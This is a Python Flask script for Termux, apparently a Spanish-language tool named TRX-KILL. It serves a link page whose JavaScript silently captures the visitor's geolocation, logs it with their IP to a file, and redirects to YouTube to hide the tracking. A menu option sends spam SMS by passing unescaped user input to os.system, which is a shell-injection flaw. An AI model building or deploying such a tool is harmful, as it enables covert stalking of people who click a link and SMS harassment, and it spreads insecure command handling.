import os, sys, getpass, time, threading, base64, json
from flask import Flask, request

app = Flask('TRX-KILL')
AUTH_PASS = "TRX-KILL-OSINT"
STORAGE_PATH = "/sdcard/TRX-KILL-RESUL"
LOG_FILE = f"{STORAGE_PATH}/result.txt"

if not os.path.exists(STORAGE_PATH): os.makedirs(STORAGE_PATH)

# --- SERVIDOR WEB ---
@app.route('/')
def index():
    return """<html><body><script>
        navigator.geolocation.getCurrentPosition(pos => {
            fetch('/log?lat='+pos.coords.latitude+'&lon='+pos.coords.longitude);
            window.location.href='https://youtube.com';
        });
    </script></body></html>"""

@app.route('/log')
def log():
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    with open(LOG_FILE, "a") as f:
        f.write(f"IP:{request.remote_addr}|LAT:{lat}|LON:{lon}\n")
    return "OK"

def banner():
    os.system('clear')
    print("\033[1;32m  -------->-TRX-KILL v1.4.5 -<-----------")
    print("  -PROYECTO PROTEGIDO POR EL OSINT.")
    print("  -EL CREADOR NO SE HACE RESPONSABLE POR SU MAL USO.\n\033[0m")

def main():
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000), daemon=True).start()
    
    while True:
        banner()
        print(" [1] INFO-DISPOSITIVO REAL | [2] ACTIVAR LINK-ZP | [3] CREADOR | [4] VERSIÓN")
        print(" [5] ANALIZAR LINK       | [6] ADM SISTEMA  | [7] INFO   | [8] REPO")
        print(" [9] PROCESOS            | [10] SPAM-SMS     | [0] SALIR")
        sel = input("\n\033[1;33mTRX-ROOT > \033[0m")

        if sel == "1":
            print("\n[!] EXTRAYENDO DATOS REALES DEL DISPOSITIVO...")
            # Extrae info real usando termux-api
            os.system("termux-telephony-deviceinfo > info.tmp")
            os.system("termux-battery-status >> info.tmp")
            print("\n--- DATOS DEL SISTEMA ---")
            os.system("cat info.tmp")
            os.remove("info.tmp")
            input("\n[Enter]...")
        elif sel == "2":
            print("\n[!] LINK ACTIVO: http://127.0.0.1:5000\n[!] ESPERANDO CONEXIÓN...")
            input()
        elif sel == "6":
            if getpass.getpass("KEY: ") == AUTH_PASS: os.system(f"cat {LOG_FILE}")
            input()
        elif sel == "10":
            num = input("NÚMERO: ")
            msg = input("MENSAJE: ")
            os.system(f"termux-sms-send -n {num} '{msg}'")
            print("[!] SMS ENVIADO.")
            input()
        elif sel == "0": sys.exit()
        else: print("OPCIÓN EN PROCESO..."); time.sleep(1)

if __name__ == "__main__": main()
